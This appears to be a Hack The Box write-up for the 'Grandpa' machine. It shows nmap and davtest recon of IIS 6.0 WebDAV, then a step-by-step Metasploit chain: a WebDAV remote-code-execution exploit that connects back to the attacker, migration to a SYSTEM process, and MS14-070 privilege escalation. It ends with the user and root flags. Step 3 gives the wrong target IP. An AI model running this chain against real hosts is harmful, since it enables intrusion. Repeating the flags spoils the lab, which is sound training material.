### IP
`10.10.10.14`

# Recon

### nmap
`nmap -sC -sV 10.10.10.14 -o Grandpa.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-23 23:36 EST
Nmap scan report for 10.10.10.14
Host is up (0.076s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Date: Tue, 24 Nov 2020 04:39:56 GMT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.92 seconds
```
* Looks like a server running with MS IIS 6.0 WebDAV

### davtest
`davtest -url 10.10.10.14`
```
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                10.10.10.14
********************************************************
NOTE    Random string for this session: tdJ553v
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     html    FAIL
PUT     pl      FAIL
PUT     shtml   FAIL
PUT     php     FAIL
PUT     cfm     FAIL
PUT     jhtml   FAIL
PUT     txt     FAIL
PUT     cgi     FAIL
PUT     jsp     FAIL
PUT     aspx    FAIL
PUT     asp     FAIL

********************************************************
/usr/bin/davtest Summary:
```
* Welp. Nothing we can do here


# Exploitation

* I'm gonna be honest. I tried just about every exploit online and tried generating my own shellcode and nothing worked. I couldn't bypass upload restrictions to upload a reverse shell and I couldn't do the buffer overflow either.

* However, I was much more succesful with things after resetting the machine. If you can't get anything to work, I suggest doing that.

### metasploit
* On `msfconsole`, we can run the following:

1. `search webdav iis 6.0`
2. `use exploit/windows/iis/iis_webdav_scstoragepathfromurl` in order to get remote code execution
3. `set RHOST 10.10.10.15`
4. `set LHOST tun0` in order to have the machine connect back to yours
5. `run`
6. `ps` to find processes running with `NT AUTHORITY\SYSTEM`
7. `migrate 3416` (pick the process id that your machine is running as described above)
8. `bg` to put the session into the background (keep note of the number)
9. `use post/multi/recon/local_exploit_suggester` in order to find scripts for privesc
10. `set SESSION 1` (use whatever session number your session was backgrounded to)
11. `set SHOWDESCRIPTION true` to see more details for each suggestion
12. `run`
13. `use exploit/windows/local/ms14_070_tcpip_ioctl` because we want to elevate the system
14. `set SESSION 1`
15. `set LHOST tun0`
16. `run`
```
* Now, we should have admin access. If not, go through the process and migrate steps again
* We can cd to `C:\Documents and Settings\Harry\Desktop`
        * Using the `cat` command on the meterpreter or the `more` command on the shell, we get the user flag: `bdff5ec67c3cff017f2bedc146a5d869`

* We can cd to `C:\Documents and Settings\Administrator\Desktop>` to get the root flag: `9359e905a2c35f861f6a57cecf28bb7b`

